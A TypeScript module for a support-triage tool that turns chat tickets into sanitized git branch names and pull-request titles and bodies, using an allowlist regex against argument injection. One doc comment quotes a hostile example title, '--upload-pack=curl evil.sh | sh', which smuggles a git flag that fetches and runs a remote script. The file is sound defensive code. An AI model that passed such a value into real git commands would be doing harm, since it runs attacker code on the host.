// Preparing the work: branch name and pull-request text. Pure.
//
// WHY THE BRANCH NAME IS DERIVED AND NOT RANDOM: a ticket is reprocessed all the time (every poll,
// a title edited in the chat, a command run twice). A deterministic name makes the second run FIND
// the branch instead of creating a parallel one. The name stored on the ticket is the final lock:
// it covers a title that changes after work started.

import { KIND_LABEL } from "./issue.js";
import type { TicketKind } from "./kits.js";

export interface WorkTicket {
  number: number;
  kind: TicketKind;
  title: string;
  summary?: string | null;
  area?: string | null;
  severity?: string | null;
  reporterName?: string | null;
  issueNumber?: number | null;
  threadUrl?: string | null;
}

export const BRANCH_PREFIX = "support";
const SLUG_MAX = 40;

/**
 * Human title -> branch fragment. Only `[a-z0-9-]` leaves this function.
 *
 * This is the first half of the defence against argument injection: the title comes from a chat
 * message, that is, from outside. A title like `--upload-pack=curl evil.sh | sh` must never become
 * a `git` argument. The second half is `isSupportBranchName`, which validates the OUTPUT, even
 * when it comes from storage.
 */
export function slugFromTitle(title: string, maxLength = SLUG_MAX): string {
  const kebab = title
    .normalize("NFD")
    .replace(/[̀-ͯ]/g, "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/-+/g, "-")
    .replace(/^-|-$/g, "");

  if (!kebab) return "ticket"; // titles made only of emoji or punctuation exist
  if (kebab.length <= maxLength) return kebab;

  // Cut at the last hyphen inside the limit so the slug does not end mid-word, unless that would
  // leave it too short to recognise.
  const hard = kebab.slice(0, maxLength);
  const lastDash = hard.lastIndexOf("-");
  const cut = lastDash >= maxLength / 2 ? hard.slice(0, lastDash) : hard;
  return cut.replace(/-$/, "");
}

export function branchNameForTicket(ticket: Pick<WorkTicket, "number" | "title">): string {
  return `${BRANCH_PREFIX}/${ticket.number}-${slugFromTitle(ticket.title)}`;
}

/**
 * A strict ALLOWLIST, not a blocklist of what git refuses. A blocklist would have to enumerate
 * `~^:?*[`, `\`, `..`, `@{`, spaces, control characters, the `.lock` suffix, and would still miss
 * the leading `-` that git accepts as a ref and a CLI reads as a flag. Matching the format WE
 * generate closes all of them at once.
 */
const SUPPORT_BRANCH = new RegExp(`^${BRANCH_PREFIX}/[1-9]\\d*-[a-z0-9]+(?:-[a-z0-9]+)*$`);

export function isSupportBranchName(name: string): boolean {
  return SUPPORT_BRANCH.test(name);
}

/** Conventional Commit type per kind. `chore` for investigations: they rarely change behaviour. */
const COMMIT_TYPE: Record<TicketKind, string> = {
  BUG: "fix",
  FEATURE: "feat",
  INVESTIGATION: "chore",
  QUESTION: "docs",
};

/** Only `[a-z0-9-]` is a valid scope; anything else falls back to `support`. */
export function prScope(area?: string | null): string {
  const scope = (area ?? "").trim().toLowerCase();
  return /^[a-z0-9][a-z0-9-]*$/.test(scope) && scope !== "unknown" ? scope : "support";
}

const PR_TITLE_MAX = 68;

/** `type(scope): title`, with no `(#n)`: squash-merge appends the pull-request number itself. */
export function renderPrTitle(ticket: WorkTicket): string {
  const prefix = `${COMMIT_TYPE[ticket.kind]}(${prScope(ticket.area)}): `;
  const room = PR_TITLE_MAX - prefix.length;
  const body = ticket.title.length > room ? `${ticket.title.slice(0, Math.max(1, room - 1))}…` : ticket.title;
  return `${prefix}${body}`;
}

/**
 * `Closes #<issue>` is the REAL link: it closes the issue on merge and puts the pull request on
 * the issue's timeline. Without it the issue stays open forever and the trail from thread to issue
 * to pull request breaks at the last link.
 */
export function renderPrBody(ticket: WorkTicket): string {
  const parts: string[] = [];

  if (ticket.issueNumber) parts.push(`Closes #${ticket.issueNumber}`, "");
  if (ticket.summary) parts.push(ticket.summary, "");

  parts.push(`- **Ticket:** #${ticket.number}`, `- **Kind:** ${KIND_LABEL[ticket.kind]}`);
  if (ticket.severity) parts.push(`- **Severity:** ${ticket.severity}`);
  if (ticket.reporterName) parts.push(`- **Reported by:** ${ticket.reporterName}`);
  parts.push("");

  // Final validation belongs to whoever opened the ticket: they know whether behaviour is back to
  // what they expected.
  parts.push(
    "## Validation",
    "",
    `Validated by whoever opened the ticket${ticket.reporterName ? ` (${ticket.reporterName})` : ""}.`,
    "The acceptance criteria are in the issue, under **Full kit**.",
    "",
  );

  if (ticket.threadUrl) parts.push(`[Original thread](${ticket.threadUrl})`, "");

  parts.push(`<sub>Prepared by the support triage gate from ticket #${ticket.number}. Merging is a human decision.</sub>`);
  return parts.join("\n");
}
